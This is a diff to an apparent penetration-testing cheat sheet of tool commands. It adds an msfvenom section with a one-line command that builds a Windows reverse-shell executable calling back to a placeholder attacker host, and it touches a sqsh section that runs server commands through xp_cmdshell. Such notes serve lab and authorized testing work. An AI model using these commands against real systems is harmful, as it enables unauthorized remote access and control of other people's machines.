@@ -255,6 +255,9 @@ put /path/to/local/file [/path/remote]
 # file download
 get /path/to/remote/file
 
+# change to binary mode
+binary
+
 
 GOBUSTER
 --------
@@ -349,6 +352,15 @@ ldapsearch -x -h IP_here -s sub -b 'dc=domain_here,dc=dc2_here'
 
 # get domain name
 ldapsearch -x -h IP_here -s base namingcontexts
+
+
+MSFVENOM
+--------
+# list available payloads
+msfvenom --list
+
+# create Windows TCP reverse shell exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
 
 
 MSSQL
@@ -732,7 +744,7 @@ SQSH
 # connect to SQL database
 sqsh -S IP_here -U user_here -P password_here
 
-# sqsh - execute command
+# sqsh - execute command on server
 xp_cmdshell 'command_here'
 go
 
